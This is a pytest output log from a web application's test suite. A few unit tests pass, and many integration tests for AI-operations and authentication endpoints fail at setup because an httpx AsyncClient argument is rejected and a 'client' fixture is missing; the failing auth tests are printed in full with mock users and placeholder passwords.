tests/unit/test_workflow.py::TestWorkflowErrorHandling::test_validation_error_handling PASSED [ 98%]
tests/unit/test_workflow.py::TestWorkflowErrorHandling::test_generic_exception_handling PASSED [ 99%]
tests/unit/test_workflow.py::TestWorkflowIntegration::test_workflow_with_llm_integration PASSED [ 99%]
tests/unit/test_workflow.py::TestWorkflowIntegration::test_multi_step_workflow_execution PASSED [ 99%]
tests/unit/test_workflow.py::TestWorkflowIntegration::test_workflow_with_complex_data_flow PASSED [ 99%]
tests/unit/test_workflow.py::TestWorkflowPerformance::test_workflow_execution_timing PASSED [ 99%]
tests/unit/test_workflow.py::TestWorkflowPerformance::test_workflow_memory_usage PASSED [100%]

==================================== ERRORS ====================================
___ ERROR at setup of TestAIOperationsEndpoints.test_ai_health_check_success ___
tests/integration/test_ai_operations_endpoints.py:22: in client
    async with AsyncClient(app=app, base_url="http://testserver") as ac:
E   TypeError: AsyncClient.__init__() got an unexpected keyword argument 'app'
_ ERROR at setup of TestAIOperationsEndpoints.test_ai_health_check_degraded_performance _
tests/integration/test_ai_operations_endpoints.py:22: in client
    async with AsyncClient(app=app, base_url="http://testserver") as ac:
E   TypeError: AsyncClient.__init__() got an unexpected keyword argument 'app'
_ ERROR at setup of TestAIOperationsEndpoints.test_ai_health_check_error_handling _
tests/integration/test_ai_operations_endpoints.py:22: in client
    async with AsyncClient(app=app, base_url="http://testserver") as ac:
E   TypeError: AsyncClient.__init__() got an unexpected keyword argument 'app'
_ ERROR at setup of TestAIOperationsEndpoints.test_get_active_sessions_success _
tests/integration/test_ai_operations_endpoints.py:22: in client
    async with AsyncClient(app=app, base_url="http://testserver") as ac:
E   TypeError: AsyncClient.__init__() got an unexpected keyword argument 'app'
__ ERROR at setup of TestAIOperationsEndpoints.test_get_active_sessions_empty __
tests/integration/test_ai_operations_endpoints.py:22: in client
    async with AsyncClient(app=app, base_url="http://testserver") as ac:
E   TypeError: AsyncClient.__init__() got an unexpected keyword argument 'app'
_ ERROR at setup of TestAIOperationsEndpoints.test_create_session_checkpoint_success _
tests/integration/test_ai_operations_endpoints.py:22: in client
    async with AsyncClient(app=app, base_url="http://testserver") as ac:
E   TypeError: AsyncClient.__init__() got an unexpected keyword argument 'app'
_ ERROR at setup of TestAIOperationsEndpoints.test_create_session_checkpoint_error _
tests/integration/test_ai_operations_endpoints.py:22: in client
    async with AsyncClient(app=app, base_url="http://testserver") as ac:
E   TypeError: AsyncClient.__init__() got an unexpected keyword argument 'app'
_ ERROR at setup of TestAIOperationsEndpoints.test_restore_session_checkpoint_success _
tests/integration/test_ai_operations_endpoints.py:22: in client
    async with AsyncClient(app=app, base_url="http://testserver") as ac:
E   TypeError: AsyncClient.__init__() got an unexpected keyword argument 'app'
_ ERROR at setup of TestAIOperationsEndpoints.test_restore_session_checkpoint_error _
tests/integration/test_ai_operations_endpoints.py:22: in client
    async with AsyncClient(app=app, base_url="http://testserver") as ac:
E   TypeError: AsyncClient.__init__() got an unexpected keyword argument 'app'
_ ERROR at setup of TestAIOperationsEndpoints.test_cleanup_expired_sessions_success _
tests/integration/test_ai_operations_endpoints.py:22: in client
    async with AsyncClient(app=app, base_url="http://testserver") as ac:
E   TypeError: AsyncClient.__init__() got an unexpected keyword argument 'app'
_ ERROR at setup of TestAIOperationsEndpoints.test_cleanup_expired_sessions_default_expiry _
tests/integration/test_ai_operations_endpoints.py:22: in client
    async with AsyncClient(app=app, base_url="http://testserver") as ac:
E   TypeError: AsyncClient.__init__() got an unexpected keyword argument 'app'
_ ERROR at setup of TestAIOperationsEndpoints.test_cleanup_expired_sessions_error _
tests/integration/test_ai_operations_endpoints.py:22: in client
    async with AsyncClient(app=app, base_url="http://testserver") as ac:
E   TypeError: AsyncClient.__init__() got an unexpected keyword argument 'app'
_ ERROR at setup of TestAIOperationsEndpoints.test_get_ai_metrics_summary_success _
tests/integration/test_ai_operations_endpoints.py:22: in client
    async with AsyncClient(app=app, base_url="http://testserver") as ac:
E   TypeError: AsyncClient.__init__() got an unexpected keyword argument 'app'
_ ERROR at setup of TestAIOperationsEndpoints.test_get_ai_metrics_summary_error _
tests/integration/test_ai_operations_endpoints.py:22: in client
    async with AsyncClient(app=app, base_url="http://testserver") as ac:
E   TypeError: AsyncClient.__init__() got an unexpected keyword argument 'app'
________ ERROR at setup of TestAIOperationsEndpoints.test_rate_limiting ________
tests/integration/test_ai_operations_endpoints.py:22: in client
    async with AsyncClient(app=app, base_url="http://testserver") as ac:
E   TypeError: AsyncClient.__init__() got an unexpected keyword argument 'app'
_ ERROR at setup of TestAIOperationsAuthentication.test_health_check_without_auth _
tests/integration/test_ai_operations_endpoints.py:345: in client
    async with AsyncClient(app=app, base_url="http://testserver") as ac:
E   TypeError: AsyncClient.__init__() got an unexpected keyword argument 'app'
_ ERROR at setup of TestAIOperationsAuthentication.test_active_sessions_without_auth _
tests/integration/test_ai_operations_endpoints.py:345: in client
    async with AsyncClient(app=app, base_url="http://testserver") as ac:
E   TypeError: AsyncClient.__init__() got an unexpected keyword argument 'app'
_ ERROR at setup of TestAIOperationsAuthentication.test_checkpoint_creation_without_auth _
tests/integration/test_ai_operations_endpoints.py:345: in client
    async with AsyncClient(app=app, base_url="http://testserver") as ac:
E   TypeError: AsyncClient.__init__() got an unexpected keyword argument 'app'
_ ERROR at setup of TestAIOperationsAuthentication.test_metrics_summary_without_auth _
tests/integration/test_ai_operations_endpoints.py:345: in client
    async with AsyncClient(app=app, base_url="http://testserver") as ac:
E   TypeError: AsyncClient.__init__() got an unexpected keyword argument 'app'
_ ERROR at setup of TestAIOperationsEndToEnd.test_session_management_workflow __
tests/integration/test_ai_operations_endpoints.py:389: in client
    async with AsyncClient(app=app, base_url="http://testserver") as ac:
E   TypeError: AsyncClient.__init__() got an unexpected keyword argument 'app'
__ ERROR at setup of TestAIOperationsEndToEnd.test_health_monitoring_workflow __
tests/integration/test_ai_operations_endpoints.py:389: in client
    async with AsyncClient(app=app, base_url="http://testserver") as ac:
E   TypeError: AsyncClient.__init__() got an unexpected keyword argument 'app'
_ ERROR at setup of TestAIOperationsPerformance.test_health_check_response_time _
tests/integration/test_ai_operations_endpoints.py:518: in client
    async with AsyncClient(app=app, base_url="http://testserver") as ac:
E   TypeError: AsyncClient.__init__() got an unexpected keyword argument 'app'
_ ERROR at setup of TestAIOperationsPerformance.test_metrics_summary_response_time _
tests/integration/test_ai_operations_endpoints.py:518: in client
    async with AsyncClient(app=app, base_url="http://testserver") as ac:
E   TypeError: AsyncClient.__init__() got an unexpected keyword argument 'app'
_ ERROR at setup of TestAIOperationsPerformance.test_concurrent_requests_handling _
tests/integration/test_ai_operations_endpoints.py:518: in client
    async with AsyncClient(app=app, base_url="http://testserver") as ac:
E   TypeError: AsyncClient.__init__() got an unexpected keyword argument 'app'
_ ERROR at setup of TestAIOperationsPerformance.test_session_operations_performance _
tests/integration/test_ai_operations_endpoints.py:518: in client
    async with AsyncClient(app=app, base_url="http://testserver") as ac:
E   TypeError: AsyncClient.__init__() got an unexpected keyword argument 'app'
_ ERROR at setup of TestAIOperationsPerformance.test_throughput_under_sustained_load _
tests/integration/test_ai_operations_endpoints.py:518: in client
    async with AsyncClient(app=app, base_url="http://testserver") as ac:
E   TypeError: AsyncClient.__init__() got an unexpected keyword argument 'app'
____ ERROR at setup of TestAuthenticationEndpoints.test_user_login_success _____
file /home/paul/boardroom-repo/tests/integration/test_auth_endpoints.py, line 19
      @patch('app.services.database.database_service')
      async def test_user_login_success(self, mock_db_service, client: AsyncClient):
          """Test successful user login."""
          # Mock user data
          mock_user = Mock()
          mock_user.id = 1
          mock_user.email = "test@example.com"
          mock_user.hashed_password = "$2b$12$hashedpassword"
          mock_user.is_active = True
          mock_user.role = "user"

          # Mock database service response
          mock_db_service.get_user_by_email.return_value = mock_user

          # Mock password verification
          with patch('app.api.v1.auth.verify_password') as mock_verify, \
               patch('app.api.v1.auth.create_access_token') as mock_create_token:

              mock_verify.return_value = True
              mock_token = Mock()
              mock_token.access_token = "mock_access_token"
              mock_token.expires_at = "2023-12-31T23:59:59"
              mock_create_token.return_value = mock_token

              response = await client.post("/api/v1/auth/user-login", json={
                  "email": "test@example.com",
                  "password": "TestPassword123!"
              })

          assert response.status_code == status.HTTP_200_OK
          data = response.json()
          assert "access_token" in data
          assert data["access_token"] == "mock_access_token"
          assert data["token_type"] == "bearer"
          assert "expires_at" in data
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_auth_endpoints.py:19
_ ERROR at setup of TestAuthenticationEndpoints.test_user_login_invalid_credentials _
file /home/paul/boardroom-repo/tests/integration/test_auth_endpoints.py, line 55
      @patch('app.services.database.database_service')
      async def test_user_login_invalid_credentials(self, mock_db_service, client: AsyncClient):
          """Test user login with invalid credentials."""
          # Mock user not found
          mock_db_service.get_user_by_email.return_value = None

          response = await client.post("/api/v1/auth/user-login", json={
              "email": "nonexistent@example.com",
              "password": "WrongPassword123!"
          })

          assert response.status_code == status.HTTP_401_UNAUTHORIZED
          data = response.json()
          assert "error" in data
          assert "authentication" in data["error"]["type"].lower()
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_auth_endpoints.py:55
_ ERROR at setup of TestAuthenticationEndpoints.test_user_login_wrong_password _
file /home/paul/boardroom-repo/tests/integration/test_auth_endpoints.py, line 71
      @patch('app.services.database.database_service')
      async def test_user_login_wrong_password(self, mock_db_service, client: AsyncClient):
          """Test user login with wrong password."""
          # Mock user data
          mock_user = Mock()
          mock_user.email = "test@example.com"
          mock_user.hashed_password = "$2b$12$hashedpassword"
          mock_user.is_active = True

          mock_db_service.get_user_by_email.return_value = mock_user

          # Mock password verification failure
          with patch('app.api.v1.auth.verify_password') as mock_verify:
              mock_verify.return_value = False

              response = await client.post("/api/v1/auth/user-login", json={
                  "email": "test@example.com",
                  "password": "WrongPassword123!"
              })

          assert response.status_code == status.HTTP_401_UNAUTHORIZED
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_auth_endpoints.py:71
_ ERROR at setup of TestAuthenticationEndpoints.test_user_login_inactive_user __
file /home/paul/boardroom-repo/tests/integration/test_auth_endpoints.py, line 93
      @patch('app.services.database.database_service')
      async def test_user_login_inactive_user(self, mock_db_service, client: AsyncClient):
          """Test user login with inactive user account."""
          # Mock inactive user
          mock_user = Mock()
          mock_user.email = "test@example.com"
          mock_user.is_active = False

          mock_db_service.get_user_by_email.return_value = mock_user

          response = await client.post("/api/v1/auth/user-login", json={
              "email": "test@example.com",
              "password": "TestPassword123!"
          })

          assert response.status_code == status.HTTP_401_UNAUTHORIZED
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_auth_endpoints.py:93
_ ERROR at setup of TestAuthenticationEndpoints.test_user_login_invalid_input __
file /home/paul/boardroom-repo/tests/integration/test_auth_endpoints.py, line 110
      async def test_user_login_invalid_input(self, client: AsyncClient):
          """Test user login with invalid input data."""
          # Test missing email
          response = await client.post("/api/v1/auth/user-login", json={
              "password": "TestPassword123!"
          })
          assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY

          # Test missing password
          response = await client.post("/api/v1/auth/user-login", json={
              "email": "test@example.com"
          })
          assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY

          # Test invalid email format
          response = await client.post("/api/v1/auth/user-login", json={
              "email": "invalid-email",
              "password": "TestPassword123!"
          })
          assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_auth_endpoints.py:110
___ ERROR at setup of TestAuthenticationEndpoints.test_user_register_success ___
file /home/paul/boardroom-repo/tests/integration/test_auth_endpoints.py, line 131
      @patch('app.services.database.database_service')
      async def test_user_register_success(self, mock_db_service, client: AsyncClient):
          """Test successful user registration."""
          # Mock successful user creation
          mock_user = Mock()
          mock_user.id = 1
          mock_user.email = "newuser@example.com"
          mock_user.username = "newuser"
          mock_user.full_name = "New User"
          mock_user.role = "user"
          mock_user.is_active = True

          mock_db_service.get_user_by_email.return_value = None  # User doesn't exist
          mock_db_service.create_user.return_value = mock_user

          with patch('app.api.v1.auth.get_password_hash') as mock_hash:
              mock_hash.return_value = "$2b$12$hashedpassword"

              response = await client.post("/api/v1/auth/register", json={
                  "email": "newuser@example.com",
                  "username": "newuser",
                  "full_name": "New User",
                  "password": "NewPassword123!",
                  "role": "user"
              })

          assert response.status_code == status.HTTP_201_CREATED
          data = response.json()
          assert data["email"] == "newuser@example.com"
          assert data["username"] == "newuser"
          assert data["full_name"] == "New User"
          assert data["role"] == "user"
          assert "password" not in data
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_auth_endpoints.py:131
_ ERROR at setup of TestAuthenticationEndpoints.test_user_register_duplicate_email _
file /home/paul/boardroom-repo/tests/integration/test_auth_endpoints.py, line 165
      @patch('app.services.database.database_service')
      async def test_user_register_duplicate_email(self, mock_db_service, client: AsyncClient):
          """Test user registration with duplicate email."""
          # Mock existing user
          mock_existing_user = Mock()
          mock_db_service.get_user_by_email.return_value = mock_existing_user

          response = await client.post("/api/v1/auth/register", json={
              "email": "existing@example.com",
              "username": "newuser",
              "full_name": "New User",
              "password": "NewPassword123!",
              "role": "user"
          })

          assert response.status_code == status.HTTP_409_CONFLICT
          data = response.json()
          assert "error" in data
          assert "conflict" in data["error"]["type"].lower()
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_auth_endpoints.py:165
_ ERROR at setup of TestAuthenticationEndpoints.test_user_register_weak_password _
file /home/paul/boardroom-repo/tests/integration/test_auth_endpoints.py, line 185
      async def test_user_register_weak_password(self, client: AsyncClient):
          """Test user registration with weak password."""
          response = await client.post("/api/v1/auth/register", json={
              "email": "newuser@example.com",
              "username": "newuser",
              "full_name": "New User",
              "password": "weak",  # Too weak
              "role": "user"
          })

          assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_auth_endpoints.py:185
_ ERROR at setup of TestAuthenticationEndpoints.test_user_register_invalid_input _
file /home/paul/boardroom-repo/tests/integration/test_auth_endpoints.py, line 197
      async def test_user_register_invalid_input(self, client: AsyncClient):
          """Test user registration with invalid input data."""
          # Test invalid email format
          response = await client.post("/api/v1/auth/register", json={
              "email": "invalid-email",
              "username": "newuser",
              "full_name": "New User",
              "password": "NewPassword123!",
              "role": "user"
          })
          assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY

          # Test missing required fields
          response = await client.post("/api/v1/auth/register", json={
              "email": "newuser@example.com",
              "password": "NewPassword123!"
              # Missing username, full_name
          })
          assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_auth_endpoints.py:197
_ ERROR at setup of TestTokenValidation.test_protected_endpoint_with_valid_token _
file /home/paul/boardroom-repo/tests/integration/test_auth_endpoints.py, line 222
      @patch('app.utils.auth.verify_token')
      async def test_protected_endpoint_with_valid_token(self, mock_verify, client: AsyncClient):
          """Test accessing protected endpoint with valid token."""
          mock_verify.return_value = "valid-thread-id"

          headers = {"Authorization": "Bearer valid_token"}
          response = await client.get("/api/v1/auth/me", headers=headers)

          # This assumes there's a /me endpoint, adjust based on actual endpoints
          # The test verifies that token validation works
          assert mock_verify.called
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_auth_endpoints.py:222
_ ERROR at setup of TestTokenValidation.test_protected_endpoint_with_invalid_token _
file /home/paul/boardroom-repo/tests/integration/test_auth_endpoints.py, line 234
      @patch('app.utils.auth.verify_token')
      async def test_protected_endpoint_with_invalid_token(self, mock_verify, client: AsyncClient):
          """Test accessing protected endpoint with invalid token."""
          mock_verify.return_value = None  # Invalid token

          headers = {"Authorization": "Bearer invalid_token"}
          response = await client.get("/api/v1/auth/me", headers=headers)

          assert response.status_code == status.HTTP_401_UNAUTHORIZED
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_auth_endpoints.py:234
_ ERROR at setup of TestTokenValidation.test_protected_endpoint_without_token __
file /home/paul/boardroom-repo/tests/integration/test_auth_endpoints.py, line 244
      async def test_protected_endpoint_without_token(self, client: AsyncClient):
          """Test accessing protected endpoint without token."""
          response = await client.get("/api/v1/auth/me")

          assert response.status_code == status.HTTP_401_UNAUTHORIZED
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_auth_endpoints.py:244
______ ERROR at setup of TestAuthenticationFlow.test_register_login_flow _______
file /home/paul/boardroom-repo/tests/integration/test_auth_endpoints.py, line 255
      @patch('app.services.database.database_service')
      async def test_register_login_flow(self, mock_db_service, client: AsyncClient):
          """Test complete register then login flow."""
          # Mock user creation
          mock_user = Mock()
          mock_user.id = 1
          mock_user.email = "flowtest@example.com"
          mock_user.username = "flowtest"
          mock_user.full_name = "Flow Test"
          mock_user.role = "user"
          mock_user.is_active = True
          mock_user.hashed_password = "$2b$12$hashedpassword"

          # First call for registration check (user doesn't exist)
          # Second call for login (user exists)
          mock_db_service.get_user_by_email.side_effect = [None, mock_user]
          mock_db_service.create_user.return_value = mock_user

          with patch('app.api.v1.auth.get_password_hash') as mock_hash, \
               patch('app.api.v1.auth.verify_password') as mock_verify, \
               patch('app.api.v1.auth.create_access_token') as mock_create_token:

              mock_hash.return_value = "$2b$12$hashedpassword"
              mock_verify.return_value = True
              mock_token = Mock()
              mock_token.access_token = "flow_test_token"
              mock_token.expires_at = "2023-12-31T23:59:59"
              mock_create_token.return_value = mock_token

              # Step 1: Register
              register_response = await client.post("/api/v1/auth/register", json={
                  "email": "flowtest@example.com",
                  "username": "flowtest",
                  "full_name": "Flow Test",
                  "password": "FlowPassword123!",
                  "role": "user"
              })

              assert register_response.status_code == status.HTTP_201_CREATED

              # Step 2: Login with same credentials
              login_response = await client.post("/api/v1/auth/user-login", json={
                  "email": "flowtest@example.com",
                  "password": "FlowPassword123!"
              })

              assert login_response.status_code == status.HTTP_200_OK
              login_data = login_response.json()
              assert "access_token" in login_data
E       fixture 'client' not found
